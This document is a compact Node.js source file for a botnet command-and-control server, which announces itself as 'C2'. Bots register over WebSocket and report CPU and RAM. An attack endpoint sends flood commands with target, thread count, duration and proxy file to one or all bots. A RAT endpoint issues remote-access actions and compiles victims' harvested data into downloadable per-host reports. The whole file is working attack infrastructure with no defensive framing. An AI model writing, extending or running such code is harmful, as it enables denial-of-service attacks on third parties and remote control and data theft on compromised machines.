const express=require('express'),http=require('http'),fs=require('fs'),path=require('path'),crypto=require('crypto');
const WebSocket=require('ws');
const app=express(),server=http.createServer(app),wss=new WebSocket.Server({server});
app.use(express.json({limit:'50mb'}));
app.use(express.static('public'));
app.use('/methods',express.static('methods'));

const ADMIN={user:'admin',pass:'admin123'};
const JWT_SECRET=crypto.randomBytes(32).toString('hex');
let tokens={},db={bots:{},commands:{},logs:[],attacks:{}};

try{if(fs.existsSync('/tmp/db.json'))db=JSON.parse(fs.readFileSync('/tmp/db.json'))}catch(e){}
setInterval(()=>fs.writeFileSync('/tmp/db.json',JSON.stringify(db)),30000);
setInterval(()=>{let n=Date.now();for(let id in db.bots)if(n-new Date(db.bots[id].lastSeen)>30000)delete db.bots[id]},10000);

function auth(req,res,next){const t=req.headers.authorization;if(!t||!tokens[t.replace('Bearer ','')])return res.status(401).json({error:'Unauthorized'});next()}

app.post('/api/login',(req,res)=>{const{u,p}=req.body;if(u===ADMIN.user&&p===ADMIN.pass){const t=crypto.randomBytes(32).toString('hex');tokens[t]=Date.now();res.json({ok:true,token:t})}else res.status(403).json({error:'Wrong'})});
app.get('/api/bots',auth,(req,res)=>res.json(db.bots));
app.get('/api/bots/:id',auth,(req,res)=>res.json(db.bots[req.params.id]||{}));
app.post('/api/attack',auth,(req,res)=>{const{botId,method,target,threads,duration,proxyFile}=req.body;const cmd={action:'attack',method,target,threads:parseInt(threads)||100,duration:parseInt(duration)||60,proxyFile:proxyFile||''};if(botId==='ALL')db.commands['ALL']=cmd;else db.commands[botId]=cmd;db.logs.push({time:new Date().toISOString(),type:'attack',botId,method,target});res.json({ok:true})});
app.post('/api/stop',auth,(req,res)=>{const{botId}=req.body;if(botId==='ALL')db.commands['ALL']={action:'stop'};else db.commands[botId]={action:'stop'};res.json({ok:true})});
app.post('/api/rat',auth,(req,res)=>{const{botId,action,params}=req.body;const cmd={action:'rat',ratAction:action,params:params||''};if(botId==='ALL')db.commands['ALL']=cmd;else db.commands[botId]=cmd;res.json({ok:true})});
app.get('/api/logs',auth,(req,res)=>res.json(db.logs.slice(-200)));
app.get('/api/downloadinfo/:id',auth,(req,res)=>{const b=db.bots[req.params.id];if(!b)return res.status(404).send('Not found');let t='=== BOT REPORT ===\n\n';t+=`ID: ${b.id}\nHostname: ${b.hostname}\nIP: ${b.ip}\nStatus: ${b.status}\nCPU: ${b.cpu}%\nRAM: ${b.ram}%\nGPU: ${b.gpu}\n\n--- RAT DATA ---\n`;for(let k in b)if(k.startsWith('rat_'))t+=`${k.replace('rat_','')}: ${b[k]}\n\n`;res.setHeader('Content-Disposition','attachment; filename=bot_'+b.hostname+'.txt');res.send(t)});
app.get('/',(req,res)=>res.sendFile(path.join(__dirname,'public','panel.html')));

wss.on('connection',ws=>{let bid=null;ws.on('message',msg=>{try{let d=JSON.parse(msg);if(d.type==='register'){bid=d.id;for(let i in db.bots)if(db.bots[i].hostname===d.hostname&&i!==bid)delete db.bots[i];db.bots[bid]={id:bid,hostname:d.hostname||'?',ip:d.ip,online:true,status:'ONLINE',cpu:0,ram:0,gpu:'?',lastSeen:new Date().toISOString()};ws.send(JSON.stringify({type:'registered'}))}if(d.type==='heartbeat'&&bid){if(db.bots[bid]){db.bots[bid].cpu=d.cpu;db.bots[bid].ram=d.ram;db.bots[bid].lastSeen=new Date().toISOString();db.bots[bid].online=true}let cmd=db.commands[bid]||db.commands['ALL']||null;if(cmd){delete db.commands[bid];delete db.commands['ALL'];ws.send(JSON.stringify({type:'command',data:cmd}))}}if(d.type==='rat_result'&&bid){if(!db.bots[bid])db.bots[bid]={};db.bots[bid]['rat_'+d.ratType]=d.data;db.logs.push({time:new Date().toISOString(),botId:bid,ratType:d.ratType})}if(d.type==='attack_status'&&bid){if(db.bots[bid]){db.bots[bid].status=d.status;db.bots[bid].target=d.target}}}catch(e){}});ws.on('close',()=>{if(bid&&db.bots[bid])db.bots[bid].online=false})});

const PORT=process.env.PORT||10000;
server.listen(PORT,()=>console.log('C2 running on',PORT));
